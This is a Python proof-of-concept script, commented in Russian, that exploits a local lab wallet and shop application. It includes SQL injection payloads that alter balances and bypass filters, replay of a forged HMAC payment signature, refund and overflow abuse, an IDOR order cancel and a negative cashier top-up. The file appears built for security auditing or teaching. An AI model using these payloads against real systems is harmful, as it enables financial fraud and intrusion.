#!/usr/bin/env python3
"""
stage_money.py — «Деньги»: как напечатать, увести и повторить деньги.

    python3 poc/stage_money.py

Стенд должен быть поднят: docker compose up -d --build
Пояснения к каждому шагу печатаются прямо в консоли, полные шаги — в poc/STEPS.md
"""
from lib import *  # noqa: F401,F403


def main():
    step("1. вход под рабочей учёткой")
    client = login_as("ivanov", "workplace1")
    if not client:
        fail("не удалось войти, стенд поднят?")
        return 1
    ok("сессия получена")

    step("2. OW-14: SQL-инъекция в сумме: запись в базу мимо всего кода")
    say("Поле amount_rub не парсится как число — и сервер выполняет его как SQL-запрос",
        "(handlers_money.go:172-180). lib/pq при Exec без параметров гоняет все команды",
        "подряд, поэтому в форму перевода вставляется любая правка в базе: балансы,",
        "роли, пароли, статусы. Ни одна проверка приложения между нами и базой не стоит.")
    b1 = user_balance_kop("ivanov")
    payload = "1;UPDATE users SET balance_kop=balance_kop+500000 WHERE id=1;--"
    req("POST /transfer/new  recipient=petrova amount_rub=%s" % payload,
        "/transfer/new", client=client,
        data={"recipient": "petrova", "amount_rub": payload, "memo": "x"})
    b2 = user_balance_kop("ivanov")
    if b1 and b2 and int(b2) - int(b1) == 500000:
        artifact("OW-14 · SQL-инъекция изменила баланс напрямую",
                 "users.login=ivanov  balance_kop: %s → %s (дельта +500000 коп)" % (b1, b2),
                 "Запрос приложения не проверял и не вычислял эту прибавку." )
        ok("баланс ivanov увеличен на 5000₽ через SQL-инъекцию")
    else:
        fail("ожидали +500000 коп, получили balance_kop %s → %s" % (b1, b2))
    say("А если подзапрос вернёт строку — приведение к bigint упадёт, и текст ошибки",
        "с содержимым печатается прямо в форме. На этом же месте читаются все хеши",
        "(см. stage_data.py, шаг 3).")

    step("3. OW-17: повтор платежа: подпись есть, а ограничений нет")
    say("Подпись платежа — HMAC(константа PAYMENT_KEY, 'op:сумма:получатель'), ключ",
        "лежит в статике приложения (wallet.js). В подписи нет ни nonce, ни срока, ни",
        "привязки к сессии (handlers_money.go:368-401): проверяется только совпадение",
        "хеша. Значит одна и та же подпись проводит платёж сколько угодно раз, а поле",
        "to_login вообще меняет получателя мимо подписанного (строки 384-388).")
    op = db("SELECT id||' '||amount_kop||' '||to_user_id FROM operations "
            "WHERE to_user_id IS NOT NULL ORDER BY id LIMIT 1 OFFSET 1")
    if not op:
        fail("неповторяемой операции в базе нет")
        return 1
    op_id, amount, to = op.split()
    psig = sign(PAYMENT_KEY, "%s:%s:%s" % (op_id, amount, to))
    info("операция #%s из базы: сумма %s коп, получатель %s" % (op_id, amount, to))
    info("HMAC-SHA256(%s, '%s:%s:%s') = %s..."
         % (PAYMENT_KEY, op_id, amount, to, psig[:20]))
    fields = {"op_id": op_id, "amount_kop": amount, "recipient": to, "sig": psig}
    r1 = user_balance_kop("ivanov")
    recipient_login = db("SELECT login FROM users WHERE id=%s" % to)
    to1 = user_balance_kop(recipient_login)
    tx1 = db("SELECT count(*) FROM operations WHERE kind='transfer' AND memo='повтор операции'")
    resp1 = req("POST /pay/replay  op_id=%s&amount_kop=%s&recipient=%s&sig=<подпись посчитана "
        "сама> (повтор 1)" % (op_id, amount, to), "/pay/replay", client=client,
        data=fields)
    r2 = user_balance_kop("ivanov")
    to2 = user_balance_kop(recipient_login)
    resp2 = req("POST /pay/replay  те же поля, та же подпись (повтор 2 — сервер не отличает)",
        "/pay/replay", client=client, data=fields)
    r3 = user_balance_kop("ivanov")
    to3 = user_balance_kop(recipient_login)
    tx2 = db("SELECT count(*) FROM operations WHERE kind='transfer' AND memo='повтор операции'")
    replay_ok = (r1 and r2 and r3 and to1 and to2 and to3 and tx1 and tx2
                 and int(r1) - int(r2) == int(amount)
                 and int(r2) - int(r3) == int(amount)
                 and int(to2) - int(to1) == int(amount)
                 and int(to3) - int(to2) == int(amount)
                 and int(tx2) - int(tx1) == 2
                 and resp1.status in (200, 302) and resp2.status in (200, 302))
    artifact("OW-17 · одна подпись принята дважды",
             "ivanov balance_kop: %s → %s → %s" % (r1, r2, r3),
             "%s balance_kop: %s → %s → %s" % (recipient_login, to1, to2, to3),
             "operations с memo='повтор операции': %s → %s" % (tx1, tx2),
             "HTTP: %s / %s" % (resp1.status, resp2.status))
    if replay_ok:
        ok("две операции списаны и зачислены с одной подписью")
    else:
        fail("повтор не подтвердился ожидаемыми изменениями баланса и журнала")

    step("4. OW-05: возврат: печатаем и уводим деньги")
    say("Возврат считается как refund = total × qty, а qty не ограничен ни количеством",
        "в заказе, ни суммой, ни знаком (handlers_shop.go:350-363): qty=100 печатает",
        "сотню стоимости заказа, qty=-1 уводит деньги — то, и другое проводится,",
        "при отрицательном только пишется строка в anomaly_log, никто не реагирует.")
    ord1 = new_order("обычный заказ под возврат", client)
    if not ord1:
        fail("заказ не оформился")
        return 1
    say("заказ #%s оформлен (450₽), делаем возврат с qty=100:" % ord1)
    r1 = user_balance_kop("ivanov")
    req("POST /orders/%s/return  qty=100 (refund = 450₽ × 100)" % ord1,
        "/orders/%s/return" % ord1, client=client, data={"qty": "100"})
    r2 = user_balance_kop("ivanov")
    return_row = db("SELECT id||'|'||status||'|'||total_kop FROM orders WHERE id=%s" % ord1)
    if r1 and r2 and int(r2) - int(r1) == 4500000:
        artifact("OW-05 · завышенный возврат",
                 "balance_kop ivanov: %s → %s (дельта +4500000 коп)" % (r1, r2),
                 "заказ после возврата: %s" % return_row)
        ok("qty=100 начислил в 100 раз больше цены заказа")
    else:
        fail("ожидали +4500000 коп, получили balance_kop %s → %s; заказ %s"
             % (r1, r2, return_row))

    ord2 = new_order("второй заказ под отрицательный возврат", client)
    if not ord2:
        fail("второй заказ не оформился")
        return 1
    say("заказ #%s оформлен, теперь qty=-1 — деньги уходят со счёта:" % ord2)
    r3 = user_balance_kop("ivanov")
    req("POST /orders/%s/return  qty=-1 (refund = -450₽)" % ord2,
        "/orders/%s/return" % ord2, client=client, data={"qty": "-1"})
    r4 = user_balance_kop("ivanov")
    return_row2 = db("SELECT id||'|'||status||'|'||total_kop FROM orders WHERE id=%s" % ord2)
    if r3 and r4 and int(r4) - int(r3) == -45000:
        artifact("OW-05 · отрицательное количество возврата",
                 "balance_kop ivanov: %s → %s (дельта -45000 коп)" % (r3, r4),
                 "заказ после возврата: %s" % return_row2)
        ok("qty=-1 списал цену заказа, но обработан как возврат")
    else:
        fail("ожидали -45000 коп, получили balance_kop %s → %s; заказ %s"
             % (r3, r4, return_row2))

    step("5. OW-04: отмена чужого заказа: деньги идут его владельцу")
    say("Отмена заказа: проверка владельца стоит только на показе страницы, на самом",
        "действии её нет (handlers_shop.go:304-329). Отменяет заказ кто угодно, а",
        "деньги возвращаются на счёт владельца — учёт и выдача рассинхронизируются.")
    foreign = db("SELECT id FROM orders WHERE user_id<>1 AND status IN "
                 "('paid','delivered') ORDER BY id LIMIT 1")
    if not foreign:
        say("чужого непогашенного заказа не осталось — создаём его напрямую в базе",
            "(доступ к БД у нас из docker-compose.yml, пароль wallet/wallet):")
        info("→ INSERT INTO orders (user_id, status, total_kop, ...) "
             "VALUES (2, 'paid', 45000, ...)")
        foreign = db("INSERT INTO orders (user_id, status, total_kop, lines_json, "
                     "item_comment) VALUES (2,'paid',45000,'[]','создан для "
                     "проверки IDOR') RETURNING id")
        info("← psql: заказ #%s создан" % foreign)
    owner = db("SELECT user_id FROM orders WHERE id=%s" % foreign)
    v1 = db("SELECT balance_kop FROM users WHERE id=%s" % owner)
    status1 = order_status(foreign)
    artifact("OW-04 · чужой заказ до атаки",
             "заказ #%s, владелец user_id=%s, статус=%s" % (foreign, owner, status1),
             "баланс владельца до: %s коп" % v1)
    r = req("GET /orders/%s  (просмотр чужого заказа — проверки владельца нет)"
            % foreign, "/orders/%s" % foreign, client=client)
    if "Заказ #%s" % foreign in r:
        info("увидели: Заказ #%s" % foreign)
    req("POST /orders/%s/cancel  (отмена чужого заказа)" % foreign,
        "/orders/%s/cancel" % foreign, client=client, data={})
    v2 = db("SELECT balance_kop FROM users WHERE id=%s" % owner)
    order_status(foreign)
    status2 = order_status(foreign)
    if v1 != v2 and "cancelled" in status2:
        artifact("OW-04 · чужой заказ после атаки",
                 "POST /orders/%s/cancel принят; статус: %s → %s" % (foreign, status1, status2),
                 "баланс владельца: %s → %s коп" % (v1, v2))
        ok("баланс жертвы %s -> %s коп: деньги вернулись ей, а отменил заказ ivanov"
           % (v1, v2))
    else:
        fail("не подтверждена отмена чужого заказа: status %s → %s, баланс %s → %s"
             % (status1, status2, v1, v2))

    step("5a. OW-07: GET отмечает заказ полученным")
    say("/orders/{id}/received меняет статус при GET, без подтверждающего POST.",
        "Проверяем состояние в БД до и после запроса.")
    received_order = new_order("OW-07 GET side effect", client)
    if not received_order:
        fail("заказ для OW-07 не оформился")
        return 1
    received_before = order_status(received_order)
    received_resp = req("GET /orders/%s/received (изменение состояния через GET)" % received_order,
                        "/orders/%s/received" % received_order, client=client)
    received_after = order_status(received_order)
    if received_resp.status in (200, 302) and received_before.endswith(" paid") \
            and received_after.endswith(" received"):
        artifact("OW-07 · GET изменил статус заказа",
                 "до: %s" % received_before,
                 "запрос: GET /orders/%s/received → HTTP %s" % (received_order, received_resp.status),
                 "после: %s" % received_after)
        ok("без POST заказ перешёл paid → received")
    else:
        fail("изменение через GET не подтверждено: %s → %s, HTTP %s"
             % (received_before, received_after, received_resp.status))

    step("5b. OW-21: SQL-инъекция в фильтре бухгалтерской сверки")
    say("memo напрямую конкатенируется в LIKE. Добавляем OR true и SQL-комментарий;",
        "в ответе должны появиться операции даже при заведомо отсутствующем фильтре.")
    recon_client = login_as("ivanov", "workplace1")
    recon_role = db("SELECT role FROM users WHERE login='ivanov'")
    if recon_role not in ("admin", "accountant"):
        db("UPDATE users SET role='accountant' WHERE login='ivanov' RETURNING role;")
        recon_client = login_as("ivanov", "workplace1")
    marker = "ow21_no_such_memo_7f91"
    normal = req("POST /accounting/reconcile memo=%s (контроль без инъекции)" % marker,
                 "/accounting/reconcile", client=recon_client,
                 data={"memo": marker})
    injected_value = "%' OR '1'='1' --"
    injected = req("POST /accounting/reconcile memo=<OR true + SQL comment>",
                   "/accounting/reconcile", client=recon_client,
                   data={"memo": injected_value})
    before_count = normal.text.count("<tr>")
    injected_count = injected.text.count("<tr>")
    if "Нет строк" in normal.text and injected_count > before_count:
        artifact("OW-21 · SQL injection развернула фильтр сверки",
                 "контроль memo=%s: строк в таблице=%d" % (marker, before_count),
                 "payload memo=%s: строк в таблице=%d" % (injected_value, injected_count),
                 "POST /accounting/reconcile → HTTP %s; ответ содержит операции" % injected.status)
        ok("SQL-предикат WHERE memo LIKE обойдён через введённый фильтр")
    else:
        fail("инъекция сверки не подтверждена: control rows=%d, injected rows=%d, HTTP=%s"
             % (before_count, injected_count, injected.status))
    if recon_role not in ("admin", "accountant"):
        db("UPDATE users SET role='%s' WHERE login='ivanov' RETURNING role;" % recon_role)
        login_as("ivanov", "workplace1")

    step("6. OW-02: котировка по дешёвой корзине, оплата после подорожания")
    say("Котировка фиксирует цену в момент запроса (checkoutQuote), а при подтверждении",
        "списывается именно она — корзина читается заново, но только чтобы положить",
        "товары в заказ (handlers_shop.go:218-250). Расхождение пишется в anomaly_log",
        "и никого не волнует. Значит: берём котировку на дешёвый товар, добавляем",
        "дорогой, платим по старой цене — оба товара в заказе.")
    db("DELETE FROM cart_items WHERE user_id=1")
    b1 = balance(client)
    req("POST /cart/add  product_id=3 (SNACK 270₽)", "/cart/add", client=client,
        data={"product_id": "3"})
    r = req("POST /checkout/quote  (котировка: корзина = 270₽)", "/checkout/quote",
            client=client, data={"promo_code": "", "tip_kop": "0",
                                 "item_comment": "OW-02"})
    m = r.search(r'name="quote_id" value="(\d+)"')
    if not m:
        fail("котировка не получена")
        return 1
    qid = m.group(1)
    req("POST /cart/add  product_id=4 (MUG 600₽) — уже ПОСЛЕ котировки",
        "/cart/add", client=client, data={"product_id": "4"})
    req("POST /checkout/confirm  quote_id=%s (платим по старой котировке)" % qid,
        "/checkout/confirm", client=client, data={"quote_id": qid})
    order = db("SELECT id||'|'||total_kop||'|'||lines_json FROM orders "
               "ORDER BY id DESC LIMIT 1;")
    b2 = balance(client)
    if order and order.split("|")[1] == "27000" and "Кружка" in order:
        artifact("OW-02 · котировка дешевле состава заказа",
                 "строка orders: %s" % order,
                 "списано по quote 27000 коп, строки заказа включают снек и кружку (87000 коп)",
                 "баланс ivanov: %s → %s руб." % (b1, b2))
        ok("заказ #%s: total=27000 коп, а в строках снек И кружка — заплатил 270₽, "
           "получил 870₽ (баланс %s -> %s руб.)"
           % (order.split("|")[0], b1, b2))
    else:
        fail("котировка/состав заказа не совпали с ожидаемым артефактом: %s" % order)

    step("7. OW-01: переполнение чаевых — покупка за 0 рублей")
    say("tip_kop берётся из формы ParseInt без проверки на переполнение, а дальше",
        "chargeKop = сумма + чаевые (handlers_shop.go:190-196). max int64 в сумме",
        "переполняет int64 в минус, проверка chargeKop < 0 обнуляет результат —",
        "котировка становится 0, и товар уходит бесплатно.")
    db("DELETE FROM cart_items WHERE user_id=1")
    req("POST /cart/add  product_id=3 (SNACK 270₽)", "/cart/add", client=client,
        data={"product_id": "3"})
    b1 = balance(client)
    r = req("POST /checkout/quote  tip_kop=9223372036854775807 (max int64)",
            "/checkout/quote", client=client,
            data={"promo_code": "", "tip_kop": "9223372036854775807",
                  "item_comment": "OW-01"})
    m = r.search(r'name="quote_id" value="(\d+)"')
    if not m:
        fail("котировка с переполнением не получена")
        return 1
    db("SELECT id||'|'||total_kop||'|'||tip_kop FROM checkout_quotes "
       "ORDER BY id DESC LIMIT 1;")
    req("POST /checkout/confirm  quote_id=%s (оплата по котировке 0)" % m.group(1),
        "/checkout/confirm", client=client, data={"quote_id": m.group(1)})
    order = db("SELECT id||'|'||total_kop FROM orders ORDER BY id DESC LIMIT 1;")
    b2 = balance(client)
    if order and order.endswith("|0") and b1 == b2:
        artifact("OW-01 · переполнение tip_kop",
                 "строка checkout_quotes: id|total_kop|tip_kop = см. SQL выше",
                 "заказ в БД: %s; баланс: %s → %s руб." % (order, b1, b2))
        ok("заказ #%s оформлен с total=0, баланс не изменился (%s -> %s руб.) — "
           "товар ушёл даром" % (order.split("|")[0], b1, b2))
    else:
        fail("бесплатная покупка не подтверждена: заказ=%s баланс=%s→%s" % (order, b1, b2))

    step("8. OW-31: переполнение рублей в копейки при переводе")
    say("parseRubToKop умножает рубли на 100 без проверки границ (render.go:52-80):",
        "ri*100 выходит за int64 и молча заворачивается. Вводим 4611686018427387914",
        "рублей (4.6 квинтиллиона) — в черновике оказывается 1000 копеек. Ни сумма,",
        "ни границы парсер не проверяет, а котировка/черновик уже считается «рабочим».")
    b1 = balance(client)
    r = req("POST /transfer/new  recipient=petrova amount_rub=4611686018427387914 "
            "(4.6 квинтиллиона рублей)", "/transfer/new", client=client,
            data={"recipient": "petrova", "amount_rub": "4611686018427387914",
                  "memo": "OW-31"})
    draft = db("SELECT id||' '||amount_kop FROM transfer_drafts ORDER BY id "
               "DESC LIMIT 1;")
    if draft and draft.split()[1] == "1000":
        artifact("OW-31 · переполнение рублей в копейки",
                 "ввод: 4611686018427387914 руб.; transfer_drafts: id|amount_kop = %s" % draft,
                 "ожидаемый артефакт: сумма превратилась в 1000 коп вместо переполнения/отказа")
        ok("черновик #%s: amount_kop=1000 (10₽) вместо 4.6 квинтиллионов — "
           "переполнение прошло" % draft.split()[0])
        say("Черновик дальше не подтверждаем — нам важен сам факт: парсер принял",
            "заведомо нелепую сумму и превратил её в другое число.")
    else:
        fail("переполнение не подтвердилось: черновик %s" % draft)

    step("9. OW-19: отрицательное кассовое пополнение")
    say("cashierTopup вызывает тот же parseRubToKop и проверяет только amount != 0",
        "(handlers_accounting.go:26-37) — знак не проверяется вовсе. Кассир (и админ,",
        "у admin роль считается кассиром) проводит пополнение на отрицательную сумму,",
        "и деньги списываются у жертвы как обычное «пополнение». Сначала поднимаем",
        "себе роль кассира — она пишется в базу, а кука её пока не знает:")
    old_role = db("SELECT role FROM users WHERE login='ivanov'")
    db("UPDATE users SET role='cashier' WHERE login='ivanov' RETURNING role;")
    client = login_as("ivanov", "workplace1")  # перелогин: роль теперь из новой куки
    if not client:
        fail("перелогин после смены роли не прошёл")
        return 1
    v1 = db("SELECT balance_kop FROM users WHERE login='petrova'")
    req("POST /cashier/topup  login=petrova amount_rub=-100 (минус 100₽)",
        "/cashier/topup", client=client,
        data={"login": "petrova", "amount_rub": "-100"})
    v2 = db("SELECT balance_kop FROM users WHERE login='petrova'")
    db("SELECT kind||' '||amount_kop||' '||memo FROM operations ORDER BY id "
       "DESC LIMIT 1;")
    if v1 != v2:
        artifact("OW-19 · отрицательное кассовое пополнение",
                 "petrova balance_kop: %s → %s" % (v1, v2),
                 "последняя операция: kind|amount_kop|memo приведена в SQL-ответе выше")
        ok("баланс petrova %s -> %s коп: отрицательное «пополнение» проведено, "
           "в операциях строка topup с минусом" % (v1, v2))
    else:
        fail("баланс не изменился — пополнение не прошло")
    db("UPDATE users SET role='%s' WHERE login='ivanov' RETURNING role;" % old_role)
    client = login_as("ivanov", "workplace1")  # возвращаем роль обратно
    info("роль ivanov возвращена: %s" % old_role)

    step("10. OW-11: ложный успех корзины и неактивный товар")
    say("cartAdd не проверяет ни существование товара, ни его флаг active",
        "(handlers_shop.go:123-135), ошибку FK он молча проглатывает и всё равно",
        "пишет flash «Добавлено в корзину». Дальше JOIN в loadCart отбрасывает",
        "несуществующие строки — товар исчезает из корзины, а пользователь уверен,",
        "что добавил. Неактивный товар, наоборот, в корзину попадает и покупается:")
    db("DELETE FROM cart_items WHERE user_id=1")
    # flash ставится кукой на 302 и показывается страницей, на которую ведёт
    # редирект — поэтому смотрим тело самого POST (urllib уже по нему прошёл),
    # а не последующий GET /cart: там flash-cookie уже погашена.
    add_resp = req("POST /cart/add  product_id=999 (нет в каталоге)", "/cart/add",
                   client=client, data={"product_id": "999"})
    flash_post = "Добавлено в корзину" in add_resp
    n = db("SELECT count(*) FROM cart_items WHERE user_id=1;")
    r = req("GET /cart  (что реально в корзине)", "/cart", client=client)
    if n == "0" and flash_post:
        artifact("OW-11 · несуществующий товар",
                 "POST /cart/add product_id=999 → HTTP %s; flash «Добавлено в корзину» показан" % add_resp.status,
                 "cart_items count=%s; GET /cart → HTTP %s, строк товара нет" % (n, r.status))
        ok("flash «Добавлено», а в корзине 0 строк — товар молча пропал")
    else:
        fail("ложный успех не подтвердился: count=%s flash_post=%s" % (n, flash_post))
    db("UPDATE products SET active=FALSE WHERE id=4 RETURNING id, code, active;")
    req("POST /cart/add  product_id=4 (MUG, active=FALSE)", "/cart/add",
        client=client, data={"product_id": "4"})
    r = req("GET /cart  (неактивный товар в корзине)", "/cart", client=client)
    if "Кружка" in r:
        count_active = db("SELECT count(*) FROM cart_items c JOIN products p ON p.id=c.product_id "
                          "WHERE c.user_id=1 AND p.id=4 AND p.active=FALSE")
        artifact("OW-11 · товар active=FALSE в корзине",
                 "product id=4 active=FALSE; строка cart_items JOIN products count=%s" % count_active,
                 "GET /cart отобразил «Кружка» несмотря на active=FALSE")
        ok("товар с active=FALSE добавлен в корзину — фильтрации нет")
    else:
        fail("неактивный товар в корзину не попал — фильтр вдруг работает")
    db("UPDATE products SET active=TRUE WHERE id=4;")
    db("DELETE FROM cart_items WHERE user_id=1;")
    info("каталог и корзина возвращены в исходное состояние")
    return 0


if __name__ == "__main__":
    sys.exit(main())
